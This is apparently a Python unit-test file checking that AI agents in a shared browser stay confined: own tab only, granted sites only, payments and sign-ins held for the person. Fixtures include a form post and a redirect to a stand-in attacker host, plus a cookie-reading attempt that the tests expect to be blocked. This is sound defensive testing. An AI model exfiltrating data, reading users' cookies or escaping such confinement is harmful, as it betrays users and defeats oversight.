"""DGC Browser, phase 4 (0.52): a Pip's runs reach its own tab there (its lane) through one ``dgc_browser`` tool.

What a Pip's run may do there, and what it never may, written before the tool:
- It works only in its own lane: never the person's own tabs, never another Pip's lane, whatever the worker asks. The
  run's socket is pinned to its Pip on the controller's side (the request names no Pip), and while a run drives, the
  browser itself refuses any command to a tab that isn't that Pip's (HostBrowser.driving).
- A page outside its grants never loads (an address it opens, a link it clicks, a redirect); a write outside them is
  never sent (a form, a download). A Pip with no grant is refused plainly and told to ask the user, with a card in its
  chat ("Let Ava use shop.lanestore.com in DGC Browser?") whose Allow grants that site to that Pip alone.
- Writes inside its grants are decided as on its own computer (its level, careful mode, Always allow, a card), and a
  payment, or anything on a bank or payment site, always waits for the person's own yes.
- It never types a password or a code there, and a form that would send one (Chrome's autofill) is never sent: the
  person signs in themselves, in their own window, from a card in the Pip's chat; then the Pip carries on.
- What its lane sent is in its own "Sent to the web" log; its tab's title says whose it is; when its run ends the lane
  idles, and closes after LANE_IDLE_SECONDS with nothing of it waiting for the person.

The unit tests run the real lane gate, DgcBrowserHost and the tool over a stand-in Chrome on DevTools' pipe (pages
from a little site map, Fetch's pause on every request of a gated tab). One test drives the installed Google Chrome,
its sandbox on, against a local site under public names (skipped where it isn't installed)."""
from __future__ import annotations

import base64
import http.server
import json
import os
import re
import shutil
import socket
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import patch
from urllib.parse import urlsplit

from dgc import pip_computer, pip_levels, pips, dgc_browser
from dgc.pip_computer_box import PERSON
from tests import test_pips_local as fixtures


def setUpModule():
    # A test never starts DGC's real desktop download (pip_screen_setup.start, as DGC Browser does where the Pip
    # computer's screen program isn't here): it fetched packages into the test's home and finished in the background
    # while later tests ran and read it. The tests of that download patch it themselves.
    from dgc import pip_screen_setup
    guard = patch.object(pip_screen_setup, "start", return_value=False)
    guard.start()
    unittest.addModuleCleanup(guard.stop)

TINY_JPEG = ("/9j/4AAQSkZJRgABAgAAAQABAAD//gAQTGF2YzYwLjMxLjEwMgD/2wBDAAgUFBcUFxsbGxsbGyAeICEhISAgICAhISEkJCQqKiokJCQhISQ"
             "kKCgqKi4vLisrKisvLzIyMjw8OTlGRkhWVmf/xABLAAEBAAAAAAAAAAAAAAAAAAAABQEBAAAAAAAAAAAAAAAAAAAABhABAAAAAAAAAAAAAAAAAAAA"
             "ABEBAAAAAAAAAAAAAAAAAAAAAP/AABEIAAYACAMBIgACEQADEQD/2gAMAwEAAhEDEQA/AIIB2Ov/2Q==")
SHOP, NOTES, OTHER, EVIL, IDP = ("shop.lanestore.com", "app.lanenotes.com", "reviews.otherplace.net",
                                 "evil.lanecollect.net", "accounts.lanestore-id.com")
PERSON_URL = "https://mail.personal-inbox.com/inbox"


def site_map():
    """The pages the stand-in serves: url -> {title, lines, refs, redirect, password}. A ref's action is what a click on
    it makes the page do: a link, a form post, a download."""
    shop = f"https://{SHOP}"
    return {
        f"{shop}/": {"title": "Lane Store", "lines": [
            '- heading "Kettle" [e1]', '- generic "Price: 42.00" [e2]', '- link "Reviews elsewhere" [e3]',
            '- button "Add to cart" [e4]', '- button "Send to a friend" [e5]', '- button "Pay now" [e6]',
            '- textbox "Password" [e7] (value=(hidden))', '- link "Your account" [e8]', '- link "Receipt PDF" [e9]'],
            "refs": {"e3": ("link", f"https://{OTHER}/kettle"), "e4": ("post", f"{shop}/cart", "item=kettle&qty=1"),
                     "e5": ("post", f"https://{EVIL}/collect", "note=hi"),
                     "e6": ("post", f"{shop}/checkout/pay", "card_number=4242424242424242&amount=42.00&currency=USD"),
                     "e7": ("secret",), "e8": ("link", f"{shop}/account"), "e9": ("download", f"{shop}/receipt.pdf")}},
        f"{shop}/go": {"redirect": f"https://{EVIL}/landing"},
        f"{shop}/account": {"redirect": f"https://{IDP}/login?next=shop"},
        f"{shop}/signin": {"title": "Sign in", "password": True, "lines": [
            '- textbox "Email" [e1]', '- textbox "Password" [e2] (value=(hidden))', '- button "Sign in" [e3]'],
            "refs": {"e2": ("secret",), "e3": ("post", f"{shop}/session", "email=me%40example.org&password=hunter2")}},
        f"https://{NOTES}/": {"title": "Notes", "lines": ['- heading "Ben\'s notes" [e1]'], "refs": {}},
        PERSON_URL: {"title": "Inbox (private)", "lines": ['- heading "Private mail" [e1]'], "refs": {}},
    }


class StandIn:
    """A stand-in Chrome on DevTools' pipe: tabs and their sessions, pages from site_map, Fetch's pause on every
    request of a gated tab (continued, it reaches "the web": ``received``), and what a Pip's click or typing makes a
    page do."""

    def __init__(self):
        self.site = site_map()
        self.sent, self.inbox, self.received, self.cancelled = [], [], [], []
        self.n = 0
        self.tabs: dict[str, dict] = {}          # target -> {session, url, title, gated, history, opener}
        self.paused: dict[str, tuple] = {}       # request id -> (session, method, url, body)
        self.centred: dict[str, str] = {}        # session -> the ref a click is about to land on
        self.typed: dict[str, str] = {}
        self.hidden = False                       # a lane in the background of the person's window (windowed mode)
        self.in_page: list = []                   # what a Pip's step did inside a hidden page: (op, ref, text)

    def settimeout(self, timeout):
        pass

    def recv(self):
        if self.inbox:
            return self.inbox.pop(0)
        raise socket.timeout("quiet")

    def close(self):
        pass

    def session_of(self, target):
        return self.tabs[target]["session"]

    def target_of(self, session):
        return next((t for t, tab in self.tabs.items() if tab["session"] == session), None)

    def attach(self, target, url, opener=""):
        self.n += 1
        session = f"S{self.n}"
        self.tabs[target] = {"session": session, "url": url, "title": "", "gated": False, "history": [url], "opener": opener}
        info = {"targetId": target, "type": "page", "url": url, "title": "", **({"openerId": opener} if opener else {})}
        self.inbox.append({"method": "Target.attachedToTarget", "params": {"sessionId": session, "targetInfo": info,
                                                                            "waitingForDebugger": True}})
        page = self.site.get(url)
        if page and page.get("title"):
            self.tabs[target]["title"] = page["title"]
        return session

    def event(self, session, method, params):
        self.inbox.append({"method": method, "params": params, **({"sessionId": session} if session else {})})

    def go(self, session, url, method="GET", body=None):
        target = self.target_of(session)
        if target is None:
            return
        if self.tabs[target]["gated"]:
            self.n += 1
            rid = f"R{self.n}"
            self.paused[rid] = (session, method, url, body)
            request = {"url": url, "method": method,
                       "headers": {"Content-Type": "application/x-www-form-urlencoded"} if body is not None else {}}
            if body is not None:
                request["postData"] = body
            self.event(session, "Fetch.requestPaused", {"requestId": rid, "resourceType": "Document", "frameId": target,
                                                        "request": request})
        else:
            self.arrive(session, url, method, body)

    def arrive(self, session, url, method="GET", body=None):
        parts = urlsplit(url)
        self.received.append((method, parts.hostname, parts.path, body))
        page = self.site.get(url) or self.site.get(url.split("?", 1)[0]) or {}
        if page.get("redirect"):
            self.go(session, page["redirect"])
            return
        self.show(session, url, page.get("title") or (parts.hostname or ""))

    def show(self, session, url, title):
        target = self.target_of(session)
        tab = self.tabs[target]
        tab["url"], tab["title"] = url, title
        tab["history"].append(url)
        self.event(session, "Page.frameNavigated", {"frame": {"id": target, "url": url}})
        self.event("", "Target.targetInfoChanged", {"targetInfo": {"targetId": target, "type": "page", "url": url, "title": title}})
        self.event(session, "Page.loadEventFired", {})

    def page(self, session):
        target = self.target_of(session)
        return self.site.get(self.tabs[target]["url"]) or {} if target else {}

    def evaluate(self, session, expression):
        target = self.target_of(session)
        tab = self.tabs.get(target) or {"url": "", "title": ""}
        page = self.site.get(tab["url"]) or {}
        if "__dgcRefs" in expression:
            return json.dumps({"url": tab["url"], "title": tab["title"], "lines": page.get("lines", []),
                               "count": len(page.get("lines", [])), "truncated": False})
        if expression == "location.href":
            return tab["url"]
        if expression == "JSON.stringify(location.href)":
            return json.dumps(tab["url"])
        if expression == "JSON.stringify([location.href, document.readyState])":
            return json.dumps([tab["url"], "complete"])
        if expression == "JSON.stringify([location.href, document.title])":
            return json.dumps([tab["url"], tab["title"]])
        if expression == "document.readyState":
            return "complete"
        if expression == "document.visibilityState":
            return "hidden" if self.hidden and target != "P1" else "visible"
        if "scrollIntoView" in expression:
            ref = re.search(r'data-dgc-ref=\\?"(e\d+)', expression)
            ref = ref.group(1) if ref else ""
            if ref not in page.get("refs", {}) and not any(f"[{ref}]" in line for line in page.get("lines", [])):
                return json.dumps({"ok": False})
            self.centred[session] = ref
            return json.dumps({"ok": True, "x": 100, "y": 100, "label": ref, "disabled": False})
        if "history.back()" in expression:
            history = tab["history"]
            if len(history) >= 2:
                history.pop()
                back = history.pop()
                self.go(session, back)
            return True
        if "out.ready" in expression:
            return json.dumps({"ready": "complete"})
        if "querySelectorAll('iframe')" in expression or "querySelectorAll('canvas')" in expression:
            return [] if "iframe" in expression else 0
        if "innerText" in expression and "location.href" in expression:
            return json.dumps([tab["url"], tab["title"], " ".join(page.get("lines", []))])
        return 1

    def call_function(self, session, declaration, arguments):
        target = self.target_of(session)
        tab = self.tabs.get(target) or {"url": ""}
        page = self.site.get(tab["url"]) or {}
        if "const FRAME = /stripe" in declaration:
            return {"boxes": [], "width": 1280, "height": 800, "ratio": 1}
        if "createImageBitmap" in declaration:
            return {"data": TINY_JPEG}
        if "const password = inputs.some" in declaration:
            return {"href": tab["url"], "password": bool(page.get("password")), "user": bool(page.get("password"))}
        if "dgcSecretField" in declaration:
            ref = str((arguments or [{}])[0].get("value") or "")
            action = page.get("refs", {}).get(ref)
            return "secret" if action and action[0] == "secret" else ("missing" if ref and not any(f"[{ref}]" in l for l in page.get("lines", [])) else "ok")
        if "function (want)" in declaration:
            return {"buttons": [], "title": ""}
        if "document.visibilityState" in declaration:
            return "hidden" if self.hidden and target != "P1" else "visible"
        if "dgcInPage" in declaration:
            values = [a.get("value") for a in (arguments or [])]
            op, ref, text = (values + [None, None, None])[:3]
            self.in_page.append((op, ref, text))
            if op in ("click", "hover") and ref not in page.get("refs", {}) and not any(f"[{ref}]" in l for l in page.get("lines", [])):
                return {"ok": False, "missing": True}
            if op == "click":
                self.centred[session] = ref
                self.press(session)
            if op == "type":
                self.typed[session] = self.typed.get(session, "") + str(text or "")
            return {"ok": True, "label": ref or ""}
        return None

    def press(self, session):
        ref = self.centred.pop(session, "")
        action = self.page(session).get("refs", {}).get(ref)
        if not action:
            return
        target = self.target_of(session)
        if action[0] == "link":
            self.go(session, action[1])
        elif action[0] == "post":
            self.go(session, action[1], "POST", action[2])
        elif action[0] == "download":
            self.n += 1
            self.event("", "Browser.downloadWillBegin", {"frameId": target, "guid": f"G{self.n}", "url": action[1],
                                                        "suggestedFilename": "receipt.pdf"})

    def send(self, payload):
        self.sent.append(payload)
        method, params, session = payload.get("method"), payload.get("params") or {}, payload.get("sessionId")
        result = {}
        if method == "Target.setAutoAttach" and not session and "P1" not in self.tabs:
            self.attach("P1", PERSON_URL)
        elif method == "Target.createTarget":
            self.n += 1
            target = f"T{self.n}"
            result = {"targetId": target}
            self.attach(target, params.get("url", "about:blank"))
        elif method == "Target.closeTarget":
            target = params.get("targetId")
            tab = self.tabs.pop(target, None)
            if tab:
                self.event("", "Target.detachedFromTarget", {"sessionId": tab["session"], "targetId": target})
                self.event("", "Target.targetDestroyed", {"targetId": target})
        elif method == "Target.getTargets":
            result = {"targetInfos": [{"targetId": t, "type": "page", "url": tab["url"], "title": tab["title"]}
                                      for t, tab in self.tabs.items()]}
        elif method == "Target.getTargetInfo":
            tab = self.tabs.get(params.get("targetId"), {})
            result = {"targetInfo": {"targetId": params.get("targetId"), "type": "page", "url": tab.get("url", ""),
                                     "title": tab.get("title", "")}}
        elif method == "Fetch.enable" and session:
            target = self.target_of(session)
            if target:
                self.tabs[target]["gated"] = True
        elif method == "Page.navigate" and session:
            self.go(session, params.get("url", ""))
        elif method == "Fetch.continueRequest":
            found = self.paused.pop(params.get("requestId"), None)
            if found:
                self.arrive(found[0], found[2], found[1], found[3])
        elif method == "Fetch.failRequest":
            found = self.paused.pop(params.get("requestId"), None)
            if found:
                self.show(found[0], "chrome-error://chromewebdata/", urlsplit(found[2]).hostname or "")
        elif method == "Runtime.evaluate" and session:
            result = {"result": {"value": self.evaluate(session, params.get("expression", ""))}}
        elif method == "Runtime.callFunctionOn" and session:
            result = {"result": {"value": self.call_function(session, params.get("functionDeclaration", ""), params.get("arguments"))}}
        elif method == "Page.createIsolatedWorld":
            result = {"executionContextId": 1}
        elif method == "Page.getFrameTree" and session:
            result = {"frameTree": {"frame": {"id": self.target_of(session) or ""}}}
        elif method == "Page.getLayoutMetrics":
            result = {"cssLayoutViewport": {"clientWidth": 1280, "clientHeight": 800}}
        elif method == "Page.captureScreenshot":
            result = {"data": TINY_JPEG}
        elif method == "Input.dispatchMouseEvent" and params.get("type") == "mouseReleased" and session:
            self.press(session)
        elif method == "Input.insertText" and session:
            self.typed[session] = self.typed.get(session, "") + str(params.get("text", ""))
        elif method == "Browser.cancelDownload":
            self.cancelled.append(params.get("guid"))
        elif method == "Browser.getWindowForTarget":
            result = {"windowId": 7, "bounds": {"left": 0, "top": 0, "width": 1280, "height": 800, "windowState": "normal"}}
        if "id" in payload:
            reply = {"id": payload["id"], "result": result}
            if session:
                reply["sessionId"] = session
            self.inbox.insert(0, reply) if method in ("Page.navigate",) else self.inbox.append(reply)

    def calls(self, method, session=None):
        return [m for m in self.sent if m.get("method") == method and (session is None or m.get("sessionId") == session)]

    def got(self, host):
        return [r for r in self.received if r[1] == host]


class FakeProcess:
    pid = 4343

    def __init__(self):
        self.code = None

    def poll(self):
        return self.code


class LaneBase(unittest.TestCase):
    def setUp(self):
        fixtures.LocalPipsTests.setUp(self)
        from dgc import dgc_browser_lane
        self.lanes = dgc_browser_lane
        personal = self.registry.personal()["id"]
        self.ava = self.store.create(personal, "Ava", None, "editor-user", pip_type="lens", computer_plan={"schema_version": 1})
        self.ben = self.store.create(personal, "Ben", None, "editor-user", pip_type="lens", computer_plan={"schema_version": 1})
        screen = patch.object(dgc_browser, "has_screen", return_value=True)
        screen.start()
        self.addCleanup(screen.stop)
        self.chrome = StandIn()

        def launch(argv, env, log_path):
            self.chrome = StandIn()                                     # (each start of Chrome is a new one)
            return FakeProcess(), self.chrome

        self.yb = dgc_browser.DgcBrowserHost(self.registry.directory, chrome=Path("/opt/google/chrome/chrome"), launch=launch,
                                               run=lambda argv, **kw: None, which=lambda name: None, platform="linux",
                                               pump_thread=False)
        self.addCleanup(self.yb.close)
        self.yb.open("", None)                                          # the person's own window, their inbox in it
        self.person = "P1"
        dgc_browser.allow_pip_site(self.registry, SHOP, self.ava["id"], "editor-user")
        dgc_browser.allow_pip_site(self.registry, NOTES, self.ben["id"], "editor-user")
        self.frames = self.base / "frames"
        self.addCleanup(self.lanes.forget_all)

    def new_run(self, pip):
        """A real queued run of this Pip (what its cards are kept under)."""
        return self.store.enqueue(pip["id"], "yb-" + str(time.monotonic_ns()), "local-console", self.cfg)["id"]

    def lane(self, pip, run=None, **settings):
        run = run or self.new_run(pip)
        lane = self.lanes.LaneHost(self.registry.directory, pip["id"], pip["workspace_id"], yb=self.yb)
        lane.add_run(run, self.frames / run, **settings)
        return lane, run

    def step(self, lane, run, op, **args):
        return lane.act_for(run, op, args)["text"]

    def actions(self, pip):
        return [pip_computer.projection(r) for r in self.registry.db.execute(
            "SELECT * FROM pip_computer_actions WHERE pip_id=? ORDER BY created_at", (pip["id"],)).fetchall()]

    def pending(self, pip, kind=None):
        return [a for a in self.actions(pip) if a["status"] == "pending" and (kind is None or a["summary"].get("kind") == kind)]


# --------------------------------------------------------------------------- confinement

class Confinement(LaneBase):
    def test_a_pip_with_no_grant_is_refused_plainly_and_told_to_ask_the_user(self):
        lane, run = self.lane(self.ben)
        said = self.step(lane, run, "open", url=f"https://{SHOP}/")
        self.assertIn("isn't one of the sites", said)
        self.assertIn("ask", said.lower())
        self.assertIn("below your reply", said, "DGC shows the person a card to allow it")
        self.assertEqual(self.chrome.got(SHOP), [], "nothing of the site was even asked for")
        [card] = self.pending(self.ben, self.lanes.SITE_KIND)
        self.assertEqual((card["summary"]["site"], card["summary"]["dgc_browser"]), ("lanestore.com", True))
        again = self.step(lane, run, "open", url=f"https://{SHOP}/")
        self.assertIn("waiting", again.lower(), "the run stops at its card, as at its own computer's")
        self.assertEqual(len(self.pending(self.ben, self.lanes.SITE_KIND)), 1)

    def test_its_granted_site_opens_in_its_own_tab_and_reads(self):
        lane, run = self.lane(self.ava)
        said = self.step(lane, run, "open", url=f"https://{SHOP}/")
        self.assertIn("Price: 42.00", said)
        self.assertIn("untrusted", said.lower(), "its words are data, never instructions")
        target = self.yb.lane_of(self.ava["id"])
        self.assertIsNotNone(target)
        self.assertNotEqual(target, self.person)
        self.assertEqual(self.yb.browser.owner_of(target), self.ava["id"])
        made = self.chrome.calls("Target.createTarget")[-1]["params"]
        self.assertTrue(made.get("background"), "its tab never comes to the front of the person's window")
        self.assertEqual(self.chrome.calls("Target.activateTarget"), [], "nothing of the person's view moves")
        self.assertEqual(self.chrome.got("mail.personal-inbox.com"), [], "the person's own tab is never driven")
        self.assertIsNone(self.yb.browser.driving, "between steps no Pip drives DGC Browser")

    def test_a_link_or_a_redirect_out_of_its_grants_never_loads(self):
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/")
        said = self.step(lane, run, "click", ref="e3")
        self.assertEqual(self.chrome.got(OTHER), [], "a link to a site it wasn't given is stopped before it is asked for")
        self.assertIn(OTHER, said)
        self.assertIn("below your reply", said)
        self.assertEqual(self.chrome.tabs[self.yb.lane_of(self.ava["id"])]["url"], f"https://{SHOP}/",
                         "its tab goes back to the page it was on, not Chrome's blocked page")
        self.assertEqual([c["summary"]["site"] for c in self.pending(self.ava, self.lanes.SITE_KIND)], ["otherplace.net"])

        lane2, run2 = self.lane(self.ava, run=self.new_run(self.ava))
        lane.end(run)
        self.step(lane2, run2, "open", url=f"https://{SHOP}/go")
        self.assertEqual(self.chrome.got(EVIL), [], "a redirect hop out of its grants is stopped too")
        self.assertTrue(any(r[1] == SHOP and r[2] == "/go" for r in self.chrome.received))

    def test_a_form_post_out_of_its_grants_is_never_sent_and_one_inside_waits_for_the_person(self):
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/")
        said = self.step(lane, run, "click", ref="e5")
        self.assertEqual(self.chrome.got(EVIL), [], "a write to another site is refused, never sent")
        self.assertIn("Not sent", said)
        self.assertEqual(self.pending(self.ava), [], "no card offers to send to a site it was never given")
        said = self.step(lane, run, "click", ref="e4")
        self.assertIn("Held", said)
        self.assertNotIn(("POST", SHOP, "/cart", "item=kettle&qty=1"), self.chrome.received)
        [card] = self.pending(self.ava)
        self.assertEqual((card["summary"]["path"], card["summary"]["dgc_browser"]), ("/cart", True))
        self.assertTrue(card["summary"].get("kind") in (None, ""), "an ordinary submit card, as on its own computer")

    def test_a_download_from_its_tab_is_cancelled(self):
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/")
        said = self.step(lane, run, "click", ref="e9")
        self.assertEqual(len(self.chrome.cancelled), 1, "a lane's download never lands among the person's files")
        self.assertIn("download", said.lower())

    def test_the_persons_own_downloads_go_on(self):
        self.chrome.event("", "Browser.downloadWillBegin", {"frameId": self.person, "guid": "Gp", "url": f"{PERSON_URL}.pdf",
                                                            "suggestedFilename": "mail.pdf"})
        with self.yb.lock:
            self.yb.browser._pump(0.01)
        self.assertEqual(self.chrome.cancelled, [])


class Payments(LaneBase):
    def test_a_payment_waits_for_the_persons_yes_at_every_level(self):
        for level in ("ask", "approve", "full"):
            with self.subTest(level=level):
                with self.registry.transaction():
                    self.registry.db.execute("DELETE FROM metadata WHERE key LIKE 'pip_hold%'")
                pip_levels.set_level(self.registry, self.ava["id"], level, "editor-user")
                lane, run = self.lane(self.ava, run=self.new_run(self.ava), level=level)
                self.step(lane, run, "open", url=f"https://{SHOP}/")
                said = self.step(lane, run, "click", ref="e6")
                self.assertNotIn("/checkout/pay", [r[2] for r in self.chrome.received if r[0] == "POST"],
                                 "a payment is never sent without the person's yes")
                self.assertTrue("Held" in said or "Not sent" in said or "ask" in said.lower(), said)
                lane.end(run)

    def test_always_allow_is_never_given_on_a_payment_in_dgc_browser(self):
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/")
        self.step(lane, run, "click", ref="e6")
        [card] = self.pending(self.ava)
        self.assertTrue(card["summary"].get("payment"))
        with self.assertRaises(dgc_browser.RegistryError):
            pip_computer.approve_always(self.registry, card["id"], card["digest"], "editor-user")

    def test_on_a_bank_site_every_write_asks_even_at_do_it_all(self):
        dgc_browser.allow_pip_site(self.registry, "northwind-bank.com", self.ava["id"], "editor-user")
        self.chrome.site["https://www.northwind-bank.com/"] = {"title": "Northwind Bank", "lines": ['- button "Save" [e1]'],
                                                                "refs": {"e1": ("post", "https://www.northwind-bank.com/prefs", "theme=dark")}}
        pip_levels.set_level(self.registry, self.ava["id"], "full", "editor-user")
        lane, run = self.lane(self.ava, level="full")
        self.step(lane, run, "open", url="https://www.northwind-bank.com/")
        self.step(lane, run, "click", ref="e1")
        self.assertNotIn("/prefs", [r[2] for r in self.chrome.received if r[0] == "POST"])


class SignIn(LaneBase):
    def test_it_never_types_into_a_password_or_code_field(self):
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/signin")
        said = self.step(lane, run, "type", ref="e2", text="guess")
        self.assertIn("never type", said)
        self.assertEqual(self.chrome.typed, {}, "nothing typed")

    def test_a_form_that_would_send_a_password_is_never_sent_and_the_person_is_asked_to_sign_in(self):
        lane, run = self.lane(self.ava)
        read = self.step(lane, run, "open", url=f"https://{SHOP}/signin")
        self.assertIn("sign_in", read, "a sign-in page says how: ask the person")
        said = self.step(lane, run, "click", ref="e3")
        self.assertEqual([r for r in self.chrome.received if r[0] == "POST"], [],
                         "a password Chrome filled in is never sent by a Pip's click")
        self.assertIn("sign in", said.lower())
        [card] = self.pending(self.ava, self.lanes.SIGN_IN_KIND)
        self.assertEqual(card["summary"]["site"], "lanestore.com")
        self.assertTrue(card["summary"]["page"].startswith(f"https://{SHOP}/"), "the card opens the site for the person")

    def test_sign_in_asks_the_person_and_a_redirect_to_a_sign_in_host_asks_too(self):
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/")
        said = self.step(lane, run, "sign_in")
        self.assertIn("their own window", said)
        self.assertEqual(len(self.pending(self.ava, self.lanes.SIGN_IN_KIND)), 1)
        lane.end(run)
        with self.registry.transaction():
            self.registry.db.execute("UPDATE pip_computer_actions SET status='rejected', resolved_at=? WHERE status='pending'",
                                     (pip_computer._now(),))
        lane2, run2 = self.lane(self.ava, run=self.new_run(self.ava))
        self.step(lane2, run2, "open", url=f"https://{SHOP}/")
        said = self.step(lane2, run2, "click", ref="e8")       # its account page sends it to the site's sign-in host
        self.assertEqual(self.chrome.got(IDP), [])
        self.assertIn("sign in", said.lower())
        self.assertEqual([c["summary"]["site"] for c in self.pending(self.ava, self.lanes.SIGN_IN_KIND)], ["lanestore.com"])
        self.assertEqual(self.pending(self.ava, self.lanes.SITE_KIND), [], "a sign-in host asks for the sign-in, not a new site")


# --------------------------------------------------------------------------- the wall: another Pip's lane, the person's tabs

class Wall(LaneBase):
    def test_another_pips_lane_and_the_persons_tabs_are_never_listed_switched_to_or_closed(self):
        ava, run_a = self.lane(self.ava)
        ben, run_b = self.lane(self.ben, run=self.new_run(self.ben))
        self.step(ava, run_a, "open", url=f"https://{SHOP}/")
        self.step(ben, run_b, "open", url=f"https://{NOTES}/")
        listing = self.step(ava, run_a, "tabs", action="list")
        self.assertIn(SHOP, listing)
        for never in (NOTES, "personal-inbox", "Inbox"):
            self.assertNotIn(never, listing)
        names = {t: self.yb.browser._tab_name(t) for t in (self.person, self.yb.lane_of(self.ben["id"]))}
        for target, name in names.items():
            with self.subTest(tab=name):
                self.assertIn("error", self.step(ava, run_a, "tabs", action="switch", tab=name))
                self.assertIn("error", self.step(ava, run_a, "tabs", action="close", tab=name))
        self.assertIn(self.person, self.chrome.tabs)
        self.assertIn(self.yb.lane_of(self.ben["id"]), self.chrome.tabs)
        self.assertNotIn("Ben's notes", self.step(ava, run_a, "read"))

    def test_while_a_pip_drives_the_browser_refuses_any_other_tab_and_the_persons_cookies(self):
        ava, run = self.lane(self.ava)
        self.step(ava, run, "open", url=f"https://{SHOP}/")
        browser = self.yb.browser
        with ava.lock:
            self.assertEqual(browser.driving, self.ava["id"])
            person = browser._attached[self.person]
            for attempt in (lambda: browser._session_call(person, "Runtime.evaluate", {"expression": "document.cookie"}),
                            lambda: browser._browser_call("Storage.getCookies"),
                            lambda: browser._browser_call("Target.closeTarget", {"targetId": self.person}),
                            lambda: browser._browser_call("Target.activateTarget", {"targetId": self.person})):
                with self.assertRaises(dgc_browser.BrowserError):
                    attempt()
            saved = browser._ws
            browser._ws = dgc_browser._PageChannel(browser._pipe, person)
            try:
                with self.assertRaises(dgc_browser.BrowserError):
                    browser.command("Runtime.evaluate", {"expression": "document.title"})
            finally:
                browser._ws = saved
        self.assertIsNone(browser.driving)

    def test_a_run_drives_only_its_own_pips_lane_whatever_the_worker_says(self):
        ava, run = self.lane(self.ava)
        ben, run_b = self.lane(self.ben, run=self.new_run(self.ben))
        self.step(ben, run_b, "open", url=f"https://{NOTES}/")
        sock = self.lanes.LaneSocket(ava, run)
        self.addCleanup(sock.close)
        pin = sock.pin()
        self.assertEqual(set(pin), {"socket", "token"}, "the worker gets a socket and a token, never a Pip to name")
        said = pip_computer.worker_reply(pin, "open", {"url": f"https://{NOTES}/", "pip_id": self.ben["id"]})["text"]
        self.assertIn("isn't one of the sites", said, "Ava's run asking for Ben's site is Ava asking: refused")
        self.assertEqual(len(self.chrome.got(NOTES)), 1, "only Ben's own visit")
        refused = pip_computer.worker_reply({**pin, "token": "0" * 48}, "read", {})["text"]
        self.assertIn("refused", refused)
        sock.close()
        self.assertIn("unavailable", pip_computer.worker_reply(pin, "read", {})["text"], "its run ended: the socket is gone")

    def test_a_second_run_of_the_same_pip_waits_its_turn(self):
        ava, run = self.lane(self.ava)
        self.step(ava, run, "open", url=f"https://{SHOP}/")
        other = self.new_run(self.ava)
        ava.add_run(other, self.frames / other)
        said = ava.act_for(other, "read", {})
        self.assertIn("waiting", said)
        self.assertIn("busy", said["text"].lower())
        ava.end(run)
        self.assertIn("Price", ava.act_for(other, "read", {})["text"])


# --------------------------------------------------------------------------- held writes, the run's end, idling

class Runs(LaneBase):
    def test_a_lane_step_never_holds_up_the_persons_own_screen_starting(self):
        # The person's own window on its VNC screen streams by itself (no lock); its start and end are counted with no
        # wait behind a Pip's step that holds DGC Browser (a page loading, up to half a minute).
        lane, run = self.lane(self.ava)
        self.step(lane, run, "open", url=f"https://{SHOP}/")
        held, release = threading.Event(), threading.Event()

        def long_step():
            with lane.lock:
                held.set()
                release.wait(10)
        worker = threading.Thread(target=long_step, daemon=True)
        worker.start()
        self.assertTrue(held.wait(5))
        try:
            started = time.monotonic()
            self.yb.screen_opened()
            self.yb.screen_closed()
            self.assertLess(time.monotonic() - started, 1.0, "the person's screen opened at once, while a Pip's step held the browser")
        finally:
            release.set()
            worker.join(5)

    def test_its_first_step_opens_dgc_browser_when_it_is_closed(self):
        # (Found live, 23 Nov: the run began its lane before DGC Browser was open, and the step's thread ended.)
        self.yb.close()
        lane, run = self.lane(self.ava)
        said = self.step(lane, run, "open", url=f"https://{SHOP}/")
        self.assertIn("Price: 42.00", said)
        self.assertTrue(self.yb.running())
        self.assertNotEqual(self.yb.lane_of(self.ava["id"]), None)
        self.assertIn("Price", self.step(lane, run, "read"), "and the next step too")


    def test_a_lanes_write_goes_to_its_run_and_with_no_run_is_never_sent(self):
        ava, run = self.lane(self.ava)
        self.step(ava, run, "open", url=f"https://{SHOP}/")
        ava.end(run)
        session = self.chrome.session_of(self.yb.lane_of(self.ava["id"]))
        self.chrome.go(session, f"https://{SHOP}/cart", "POST", "item=late")
        with self.yb.lock:
            self.yb.browser._pump(0.01)
        self.assertEqual([r for r in self.chrome.received if r[0] == "POST"], [], "a page's own write with no run: dropped")
        self.assertEqual(self.yb.browser.held, {})

    def test_when_its_run_ends_the_lane_idles_then_closes_but_not_while_something_waits(self):
        ava, run = self.lane(self.ava)
        self.step(ava, run, "open", url=f"https://{SHOP}/")
        self.step(ava, run, "click", ref="e4")                    # held: its card waits for the person
        ava.end(run)
        self.assertIsNone(ava.run_id)
        target = self.yb.lane_of(self.ava["id"])
        ava.ended_at -= dgc_browser.LANE_IDLE_SECONDS + 1
        self.yb.tick(self.registry)
        self.assertIn(target, self.chrome.tabs, "a lane whose card still waits stays: its Allow sends from there")
        [card] = self.pending(self.ava)
        pip_computer.decide(self.registry, card["id"], card["digest"], True, "editor-user")
        with patch.object(pip_computer, "_continue", return_value=None):
            pip_computer.tick(self.registry, self.cfg)
        self.assertIn(("POST", SHOP, "/cart", "item=kettle&qty=1"), self.chrome.received, "sent after the person's Allow")
        self.yb.tick(self.registry)
        self.assertNotIn(target, self.chrome.tabs, "idle, nothing waiting: closed")
        self.assertIn(self.person, self.chrome.tabs, "the person's own tab stays")


class Cards(LaneBase):
    def test_allowing_a_site_on_its_card_grants_it_to_that_pip_alone(self):
        ben, run = self.lane(self.ben)
        self.step(ben, run, "open", url=f"https://{SHOP}/kettle")
        [card] = self.pending(self.ben, self.lanes.SITE_KIND)
        with self.assertRaises(dgc_browser.RegistryError):
            pip_computer.approve_always(self.registry, card["id"], card["digest"], "editor-user")
        pip_computer.decide(self.registry, card["id"], card["digest"], True, "editor-user")
        continued = []
        with patch.object(pip_computer, "_continue", side_effect=lambda registry, row, config: continued.append(dict(row))):
            pip_computer.tick(self.registry, self.cfg)
        self.assertEqual([r["id"] for r in continued], [card["id"]], "its run is told, once")
        told = []
        from dgc import pip_chat
